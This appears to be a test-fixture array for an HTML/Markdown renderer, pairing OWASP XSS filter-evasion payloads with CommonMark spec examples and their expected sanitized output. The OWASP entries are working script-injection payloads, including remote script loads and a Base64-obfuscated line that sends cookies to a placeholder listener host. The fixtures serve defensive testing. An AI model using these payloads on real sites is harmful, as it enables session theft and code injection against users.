  { name: 'OWASP Embedded Encoded Tab', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Embedded Encoded Tab"', source: '<a href="jav&#x09;ascript:alert(\'XSS\');">Click Me</a>', outcome: 'ok', text: ['<a href="jav'], controls: [] },
  { name: 'OWASP Embedded Newline to Break Up XSS', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Embedded Newline to Break Up XSS"', source: '<a href="jav&#x0A;ascript:alert(\'XSS\');">Click Me</a>', outcome: 'ok', text: ['<a href="jav'], controls: [] },
  { name: 'OWASP Example 1: Break Up XSS Attack with Embedded Carriage Return', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Example 1: Break Up XSS Attack with Embedded Carriage Return"', source: '<a href="jav&#x0D;ascript:alert(\'XSS\');">Click Me</a>', outcome: 'ok', text: ['<a href="jav'], controls: [] },
  { name: 'OWASP Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS"', source: '<a href=" &#14;  javascript:alert(\'XSS\');">Click Me</a>', outcome: 'ok', text: ['<a href=" \uFFFD  javascript:alert(\'XSS\');">Click Me<'], controls: [] },
  { name: 'OWASP Example 4: Non-alpha-non-digit XSS', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Example 4: Non-alpha-non-digit XSS", code block 1', source: '<SCRIPT/XSS\u00A0SRC="http://xss.rocks/xss.js"></SCRIPT>', outcome: 'ok', text: ['<SCRIPT/XSS\u00A0SRC="http://xss.rocks/xss.js"></SCRI'], controls: [] },
  { name: 'OWASP Example 4: Non-alpha-non-digit XSS (2)', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Example 4: Non-alpha-non-digit XSS", code block 2', source: '<BODY\u00A0onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', outcome: 'ok', text: ['<BODY\u00A0onload!#$%&()*~+-_.,:;?@[/'], controls: [] },
  { name: 'OWASP Extraneous Open Brackets', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Extraneous Open Brackets"', source: '<<SCRIPT>alert("XSS");//\\<</SCRIPT>', outcome: 'ok', text: ['<<SCRIPT>alert("XSS");//<</SCRIPT>'], controls: [] },
  { name: 'OWASP No Closing Script Tags', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "No Closing Script Tags"', source: '<SCRIPT\u00A0SRC=http://xss.rocks/xss.js?<\u00A0B\u00A0>', outcome: 'ok', text: ['<SCRIPT\u00A0SRC=http://xss.rocks/xss.js?<\u00A0B\u00A0>'], controls: [] },
  { name: 'OWASP Protocol Resolution in Script Tags', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Protocol Resolution in Script Tags"', source: '<SCRIPT\u00A0SRC=//xss.rocks/.j>', outcome: 'ok', text: ['<SCRIPT\u00A0SRC=//xss.rocks/.j>'], controls: [] },
  { name: 'OWASP Half Open HTML/JavaScript XSS Vector', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Half Open HTML/JavaScript XSS Vector"', source: '<IMG\u00A0SRC="`<javascript:alert>`(\'XSS\')"', outcome: 'ok', text: ['<IMG\u00A0SRC="'], controls: [] },
  { name: 'OWASP Escaping JavaScript Escapes', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Escaping JavaScript Escapes", code block 2', source: '</script><script>alert(\'XSS\');</script>', outcome: 'ok', text: ['</script><script>alert(\'XSS\');</script>'], controls: [] },
  { name: 'OWASP End Title Tag', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "End Title Tag"', source: '</TITLE><SCRIPT>alert("XSS");</SCRIPT>', outcome: 'ok', text: ['</TITLE><SCRIPT>alert("XSS");</SCRIPT>'], controls: [] },
  { name: 'OWASP INPUT Image', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "INPUT Image"', source: '<INPUT\u00A0TYPE="IMAGE"\u00A0SRC="javascript:alert(\'XSS\');">', outcome: 'ok', text: ['<INPUT\u00A0TYPE="IMAGE"\u00A0SRC="javascript:alert(\'XSS\')'], controls: [] },
  { name: 'OWASP VBscript in an Image', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "VBscript in an Image"', source: '<IMG\u00A0SRC=\'vbscript:msgbox("XSS")\'>', outcome: 'ok', text: ['<IMG\u00A0SRC=\'vbscript:msgbox("XSS")\'>'], controls: [] },
  { name: 'OWASP SVG Object Tag', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "SVG Object Tag"', source: '<svg/onload=alert(\'XSS\')>', outcome: 'ok', text: ['<svg/onload=alert(\'XSS\')>'], controls: [] },
  { name: 'OWASP ECMAScript 6', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "ECMAScript 6"', source: 'Set.constructor`alert\\x28document.domain\\x29', outcome: 'ok', text: ['Set.constructor`alert\\x28document.domain\\x29'], controls: [] },
  { name: 'OWASP BODY Tag', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "BODY Tag"', source: '<BODY\u00A0ONLOAD=alert(\'XSS\')>', outcome: 'ok', text: ['<BODY\u00A0ONLOAD=alert(\'XSS\')>'], controls: [] },
  { name: 'OWASP List-style-image', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "List-style-image"', source: '<STYLE>li\u00A0{list-style-image:\u00A0url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>', outcome: 'ok', text: ['<STYLE>li\u00A0{list-style-image:\u00A0url("javascript:ale'], controls: [] },
  { name: 'OWASP STYLE sheet', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "STYLE sheet"', source: '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">', outcome: 'ok', text: ['<LINK REL="stylesheet" HREF="javascript:alert(\'X'], controls: [] },
  { name: 'OWASP Remote style sheet part 2', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Remote style sheet part 2"', source: '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>', outcome: 'ok', text: ['<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE'], controls: [] },
  { name: 'OWASP IMG STYLE with Expressions', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "IMG STYLE with Expressions"', source: 'exp/*<A\u00A0STYLE=\'no\\xss:noxss("*//*");\nxss:ex/*XSS*//*/*/pression(alert("XSS"))\'>', outcome: 'ok', text: ['exp/'], controls: [] },
  { name: 'OWASP DIV Background-image', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "DIV Background-image"', source: '<DIV\u00A0STYLE="background-image:\u00A0url(javascript:alert(\'XSS\'))">', outcome: 'ok', text: ['<DIV\u00A0STYLE="background-image:\u00A0url(javascript:ale'], controls: [] },
  { name: 'OWASP META', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "META"', source: '<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;url=javascript:alert(\'XSS\');">', outcome: 'ok', text: ['<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;url=javasc'], controls: [] },
  { name: 'OWASP META using Data', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "META using Data"', source: '<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;url=data:text/html\u00A0base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', outcome: 'ok', text: ['<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;url=data:t'], controls: [] },
  { name: 'OWASP META with Additional URL Parameter', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "META with Additional URL Parameter"', source: '<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;\u00A0URL=http://;URL=javascript:alert(\'XSS\');">', outcome: 'ok', text: ['<META\u00A0HTTP-EQUIV="refresh"\u00A0CONTENT="0;\u00A0URL=http:'], controls: [] },
  { name: 'OWASP IFRAME', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "IFRAME"', source: '<IFRAME\u00A0SRC="javascript:alert(\'XSS\');"></IFRAME>', outcome: 'ok', text: ['<IFRAME\u00A0SRC="javascript:alert(\'XSS\');"></IFRAME>'], controls: [] },
  { name: 'OWASP FRAME', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "FRAME"', source: '<FRAMESET><FRAME\u00A0SRC="javascript:alert(\'XSS\');"></FRAMESET>', outcome: 'ok', text: ['<FRAMESET><FRAME\u00A0SRC="javascript:alert(\'XSS\');">'], controls: [] },
  { name: 'OWASP Downlevel-Hidden Block', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Downlevel-Hidden Block"', source: '<!--[if\u00A0gte\u00A0IE\u00A04]>\n<SCRIPT>alert(\'XSS\');</SCRIPT>\n<![endif]-->', outcome: 'ok', text: ['<!--[if\u00A0gte\u00A0IE\u00A04]>'], controls: [] },
  { name: 'OWASP BASE Tag', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "BASE Tag"', source: '<BASE\u00A0HREF="javascript:alert(\'XSS\');//">', outcome: 'ok', text: ['<BASE\u00A0HREF="javascript:alert(\'XSS\');//">'], controls: [] },
  { name: 'OWASP OBJECT Tag', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "OBJECT Tag"', source: '<OBJECT\u00A0TYPE="text/x-scriptlet"\u00A0DATA="http://xss.rocks/scriptlet.html"></OBJECT>', outcome: 'ok', text: ['<OBJECT\u00A0TYPE="text/x-scriptlet"\u00A0DATA="http://xss'], controls: [] },
  { name: 'OWASP XML Data Island with CDATA Obfuscation', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "XML Data Island with CDATA Obfuscation"', source: '<XML\u00A0ID="xss"><I><B><IMG\u00A0SRC="javas<!--\u00A0-->cript:alert(\'XSS\')"></B></I></XML>\n<SPAN\u00A0DATASRC="#xss"\u00A0DATAFLD="B"\u00A0DATAFORMATAS="HTML"></SPAN>', outcome: 'ok', text: ['<XML\u00A0ID="xss"><I><B><IMG\u00A0SRC="javas<!--\u00A0-->cript'], controls: [] },
  { name: 'OWASP HTML+TIME in XML', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "HTML+TIME in XML"', source: '<HTML><BODY>\n<?xml:namespace\u00A0prefix="t"\u00A0ns="urn:schemas-microsoft-com:time">\n<?import\u00A0namespace="t"\u00A0implementation="#default#time2">\n<t:set\u00A0attributeName="innerHTML"\u00A0to="XSS<SCRIPT\u00A0DEFER>alert("XSS")</SCRIPT>">\n</BODY></HTML>', outcome: 'ok', text: ['<HTML><BODY>'], controls: [] },
  { name: 'OWASP SSI (Server Side Includes)', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "SSI (Server Side Includes)"', source: '<!--#exec\u00A0cmd="/bin/echo\u00A0\'<SCR\'"--><!--#exec\u00A0cmd="/bin/echo\u00A0\'IPT\u00A0SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->', outcome: 'ok', text: ['<!--#exec\u00A0cmd="/bin/echo\u00A0\'<SCR\'"--><!--#exec\u00A0cmd'], controls: [] },
  { name: 'OWASP PHP', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "PHP"', source: '<?\u00A0echo(\'<SCR)\';\necho(\'IPT>alert("XSS")</SCRIPT>\');\u00A0?>', outcome: 'ok', text: ['<?\u00A0echo(\'<SCR)\';'], controls: [] },
  { name: 'OWASP XSS Using HTML Quote Encapsulation', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "XSS Using HTML Quote Encapsulation", code block 1', source: '<SCRIPT\u00A0a=">"\u00A0SRC="httx://xss.rocks/xss.js"></SCRIPT>', outcome: 'ok', text: ['<SCRIPT\u00A0a=">"\u00A0SRC="httx://xss.rocks/xss.js"></SC'], controls: [] },
  { name: 'OWASP XSS Using HTML Quote Encapsulation (2)', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "XSS Using HTML Quote Encapsulation", code block 7', source: '<SCRIPT>document.write("<SCRI");</SCRIPT>PT\u00A0SRC="httx://xss.rocks/xss.js"></SCRIPT>', outcome: 'ok', text: ['<SCRIPT>document.write("<SCRI");</SCRIPT>PT\u00A0SRC='], controls: [] },
  { name: 'OWASP URL Encoding', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "URL Encoding"', source: '<A\u00A0HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>', outcome: 'ok', text: ['<A\u00A0HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2'], controls: [] },
  { name: 'OWASP Mixed Encoding', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Mixed Encoding"', source: '<A\u00A0HREF="h\ntt\u00A0\u00A0p://6\t6.000146.0x7.147/">XSS</A>', outcome: 'ok', text: ['<A\u00A0HREF="h'], controls: [] },
  { name: 'OWASP JavaScript Link Location', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "JavaScript Link Location"', source: '<A\u00A0HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>', outcome: 'ok', text: ['<A\u00A0HREF="javascript:document.location=\'http://ww'], controls: [] },
  { name: 'OWASP Base64 Encoding', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Base64 Encoding"', source: '<img\u00A0onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">', outcome: 'ok', text: ['<img\u00A0onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249'], controls: [] },
  { name: 'OWASP WAF ByPass Strings for XSS', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "WAF ByPass Strings for XSS", code block 1', source: '<svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\')></script', outcome: 'ok', text: ['<svg><script xlink:href=data:,window.open(\'https'], controls: [] },
  { name: 'OWASP Filter Bypass Alert Obfuscation', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Filter Bypass Alert Obfuscation"', source: '&#96;`${alert``}`&#96;', outcome: 'ok', text: ['`'], controls: [] },
  { name: 'CommonMark example 148 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 148, section "HTML blocks"', source: '<table><tr><td>\n<pre>\n**Hello**,\n\n_world_.\n</pre>\n</td></tr></table>', outcome: 'ok', text: ['<table><tr><td>'], controls: [] },
  { name: 'CommonMark example 152 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 152, section "HTML blocks"', source: '<DIV CLASS="foo">\n\n*Markdown*\n\n</DIV>', outcome: 'ok', text: ['<DIV CLASS="foo">'], controls: [] },
  { name: 'CommonMark example 159 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 159, section "HTML blocks"', source: '<div><a href="bar">*foo*</a></div>', outcome: 'ok', text: ['<div><a href="bar">'], controls: [] },
  { name: 'CommonMark example 162 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 162, section "HTML blocks"', source: '<a href="foo">\n*bar*\n</a>', outcome: 'ok', text: ['<a href="foo">'], controls: [] },
  { name: 'CommonMark example 170 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 170, section "HTML blocks"', source: '<script type="text/javascript">\n// JavaScript example\n\ndocument.getElementById("demo").innerHTML = "Hello JavaScript!";\n</script>\nokay', outcome: 'ok', text: ['<script type="text/javascript">'], controls: [] },
  { name: 'CommonMark example 171 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 171, section "HTML blocks"', source: '<textarea>\n\n*foo*\n\n_bar_\n\n</textarea>', outcome: 'ok', text: ['<textarea>'], controls: [] },
  { name: 'CommonMark example 172 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 172, section "HTML blocks"', source: '<style\n  type="text/css">\nh1 {color:red;}\n\np {color:blue;}\n</style>\nokay', outcome: 'ok', text: ['<style'], controls: [] },
  { name: 'CommonMark example 177 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 177, section "HTML blocks"', source: '<!-- foo -->*bar*\n*baz*', outcome: 'ok', text: ['<!-- foo -->'], controls: [] },
  { name: 'CommonMark example 179 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 179, section "HTML blocks"', source: '<!-- Foo\n\nbar\n   baz -->\nokay', outcome: 'ok', text: ['<!-- Foo'], controls: [] },
  { name: 'CommonMark example 180 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 180, section "HTML blocks"', source: '<?php\n\n  echo \'>\';\n\n?>\nokay', outcome: 'ok', text: ['<?php'], controls: [] },
  { name: 'CommonMark example 181 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 181, section "HTML blocks"', source: '<!DOCTYPE html>', outcome: 'ok', text: ['<!DOCTYPE html>'], controls: [] },
  { name: 'CommonMark example 182 (HTML blocks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 182, section "HTML blocks"', source: '<![CDATA[\nfunction matchwo(a,b)\n{\n  if (a < b && a < 0) then {\n    return 1;\n\n  } else {\n\n    return 0;\n  }\n}\n]]>\nokay', outcome: 'ok', text: ['<![CDATA['], controls: [] },
  { name: 'CommonMark example 616 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 616, section "Raw HTML"', source: '<a foo="bar" bam = \'baz <em>"</em>\'\n_boolean zoop:33=zoop:33 />', outcome: 'ok', text: ['<a foo="bar" bam = \'baz <em>"</em>\''], controls: [] },
  { name: 'CommonMark example 619 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 619, section "Raw HTML"', source: '<a h*#ref="hi">', outcome: 'ok', text: ['<a h*#ref="hi">'], controls: [] },
  { name: 'CommonMark example 620 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 620, section "Raw HTML"', source: '<a href="hi\'> <a href=hi\'>', outcome: 'ok', text: ['<a href="hi\'> <a href=hi\'>'], controls: [] },
  { name: 'CommonMark example 624 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 624, section "Raw HTML"', source: '</a href="foo">', outcome: 'ok', text: ['</a href="foo">'], controls: [] },
  { name: 'CommonMark example 625 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 625, section "Raw HTML"', source: 'foo <!-- this is a --\ncomment - with hyphens -->', outcome: 'ok', text: ['foo <!-- this is a --'], controls: [] },
  { name: 'CommonMark example 627 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 627, section "Raw HTML"', source: 'foo <?php echo $a; ?>', outcome: 'ok', text: ['foo <?php echo $a; ?>'], controls: [] },
  { name: 'CommonMark example 629 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 629, section "Raw HTML"', source: 'foo <![CDATA[>&<]]>', outcome: 'ok', text: ['foo <![CDATA[>&<]]>'], controls: [] },
  { name: 'CommonMark example 630 (Raw HTML)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 630, section "Raw HTML"', source: 'foo <a href="&ouml;">', outcome: 'ok', text: ['foo <a href="\u00F6">'], controls: [] },
  { name: 'CommonMark example 26 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 26, section "Entity and numeric character references"', source: '&#35; &#1234; &#992; &#0;', outcome: 'ok', text: ['# \u04D2 \u03E0 \uFFFD'], controls: [] },
  { name: 'CommonMark example 27 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 27, section "Entity and numeric character references"', source: '&#X22; &#XD06; &#xcab;', outcome: 'ok', text: ['" \u0D06 \u0CAB'], controls: [] },
  { name: 'CommonMark example 28 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 28, section "Entity and numeric character references"', source: '&nbsp &x; &#; &#x;\n&#87654321;\n&#abcdef0;\n&ThisIsNotDefined; &hi?;', outcome: 'ok', text: ['&nbsp &x; &#; &#x;'], controls: [] },
  { name: 'CommonMark example 31 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 31, section "Entity and numeric character references"', source: '<a href="&ouml;&ouml;.html">', outcome: 'ok', text: ['<a href="\u00F6\u00F6.html">'], controls: [] },
  { name: 'CommonMark example 32 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 32, section "Entity and numeric character references"', source: '[foo](/f&ouml;&ouml; "f&ouml;&ouml;")', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'CommonMark example 34 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 34, section "Entity and numeric character references"', source: '``` f&ouml;&ouml;\nfoo\n```', outcome: 'ok', text: ['foo'], controls: [] },
  { name: 'CommonMark example 39 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 39, section "Entity and numeric character references"', source: 'foo&#10;&#10;bar', outcome: 'ok', text: ['foo'], controls: [] },
  { name: 'CommonMark example 41 (Entity and numeric character references)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 41, section "Entity and numeric character references"', source: '[a](url &quot;tit&quot;)', outcome: 'ok', text: ['[a](url "tit")'], controls: [] },
  { name: 'CommonMark example 594 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 594, section "Autolinks"', source: '<http://foo.bar.baz>', outcome: 'ok', text: ['http://foo.bar.baz'], controls: [ext('http://foo.bar.baz')] },
  { name: 'CommonMark example 595 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 595, section "Autolinks"', source: '<https://foo.bar.baz/test?q=hello&id=22&boolean>', outcome: 'ok', text: ['https://foo.bar.baz/test?q=hello&id=22&boolean'], controls: [ext('https://foo.bar.baz/test?q=hello&id=22&boolean')] },
  { name: 'CommonMark example 597 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 597, section "Autolinks"', source: '<MAILTO:FOO@BAR.BAZ>', outcome: 'ok', text: ['MAILTO:FOO@BAR.BAZ'], controls: [ext('MAILTO:FOO@BAR.BAZ')] },
  { name: 'CommonMark example 598 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 598, section "Autolinks"', source: '<a+b+c:d>', outcome: 'ok', text: ['a+b+c:d'], controls: [], inert: 1 },
  { name: 'CommonMark example 599 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 599, section "Autolinks"', source: '<made-up-scheme://foo,bar>', outcome: 'ok', text: ['made-up-scheme://foo,bar'], controls: [], inert: 1 },
  { name: 'CommonMark example 600 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 600, section "Autolinks"', source: '<https://../>', outcome: 'ok', text: ['https://../'], controls: [ext('https://../')] },
  { name: 'CommonMark example 601 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 601, section "Autolinks"', source: '<localhost:5001/foo>', outcome: 'ok', text: ['localhost:5001/foo'], controls: [], inert: 1 },
  { name: 'CommonMark example 602 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 602, section "Autolinks"', source: '<https://foo.bar/baz bim>', outcome: 'ok', text: ['<https://foo.bar/baz bim>'], controls: [] },
  { name: 'CommonMark example 603 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 603, section "Autolinks"', source: '<https://example.com/\\[\\>', outcome: 'ok', text: ['https://example.com/\\[\\'], controls: [ext('https://example.com/%5C%5B%5C')] },
  { name: 'CommonMark example 604 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 604, section "Autolinks"', source: '<foo@bar.example.com>', outcome: 'ok', text: ['foo@bar.example.com'], controls: [ext('mailto:foo@bar.example.com')] },
  { name: 'CommonMark example 606 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 606, section "Autolinks"', source: '<foo\\+@bar.example.com>', outcome: 'ok', text: ['<foo+@bar.example.com>'], controls: [] },
  { name: 'CommonMark example 607 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 607, section "Autolinks"', source: '<>', outcome: 'ok', text: ['<>'], controls: [] },
  { name: 'CommonMark example 608 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 608, section "Autolinks"', source: '< https://foo.bar >', outcome: 'ok', text: ['< https://foo.bar >'], controls: [] },
  { name: 'CommonMark example 609 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 609, section "Autolinks"', source: '<m:abc>', outcome: 'ok', text: ['<m:abc>'], controls: [] },
  { name: 'CommonMark example 611 (Autolinks)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 611, section "Autolinks"', source: 'https://example.com', outcome: 'ok', text: ['https://example.com'], controls: [] },
